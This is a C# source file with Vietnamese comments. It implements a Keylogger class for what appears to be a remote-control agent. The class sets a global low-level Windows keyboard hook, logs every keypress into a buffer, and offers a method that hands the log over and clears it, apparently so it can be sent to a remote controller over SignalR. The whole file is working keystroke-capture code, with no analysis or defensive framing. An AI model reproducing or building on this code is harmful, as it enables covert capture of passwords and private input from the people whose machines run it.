﻿using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using RemoteControl.Agent.Native; // Sử dụng file NativeMethods bạn đã gửi

namespace RemoteControl.Agent.Services.Input
{
    public class Keylogger
    {
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static StringBuilder _logBuffer = new StringBuilder();
        private static bool _isRunning = false;
        private Thread? _loggerThread;

        public void Start()
        {
            if (_isRunning) return;
            _isRunning = true;
            _logBuffer.Clear();

            // Chạy hook trên 1 luồng riêng để không chặn SignalR
            _loggerThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                // Vòng lặp tin nhắn để giữ Hook hoạt động (Native Message Loop)
                NativeMethods.MSG msg;
                while (_isRunning && NativeMethods.GetMessage(out msg, IntPtr.Zero, 0, 0))
                {
                    NativeMethods.TranslateMessage(ref msg);
                    NativeMethods.DispatchMessage(ref msg);
                }
                UnhookWindowsHookEx(_hookID);
            });

            _loggerThread.IsBackground = true;
            _loggerThread.Start();
        }

        public void Stop()
        {
            _isRunning = false;
            if (_hookID != IntPtr.Zero)
            {
                NativeMethods.UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        public bool IsRunning() => _isRunning;

        // Hàm lấy log ra và xóa bộ đệm để gửi đi
        public string GetLogAndClear()
        {
            lock (_logBuffer)
            {
                if (_logBuffer.Length == 0) return string.Empty;
                string result = _logBuffer.ToString();
                _logBuffer.Clear();
                return result;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule!)
            {
                return NativeMethods.SetWindowsHookEx(
                    NativeMethods.WH_KEYBOARD_LL,
                    proc,
                    NativeMethods.GetModuleHandle(curModule.ModuleName),
                    0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                // Logic map phím đơn giản
                string keyName = ((Keys)vkCode).ToString();

                // Xử lý một số phím đặc biệt cho dễ đọc
                if (vkCode >= 48 && vkCode <= 57) keyName = (vkCode - 48).ToString(); // Số 0-9
                if (vkCode >= 65 && vkCode <= 90) keyName = ((char)vkCode).ToString(); // Chữ A-Z

                // Kiểm tra Shift / Capslock (nếu cần xử lý hoa/thường kỹ hơn thì dùng API GetKeyState)

                lock (_logBuffer)
                {
                    if (keyName == "Space") _logBuffer.Append(" ");
                    else if (keyName == "Return") _logBuffer.Append("[ENTER]");
                    else if (keyName == "Back") _logBuffer.Append("[BACKSPACE]");
                    else _logBuffer.Append(keyName);
                }
            }
            return NativeMethods.CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    }
}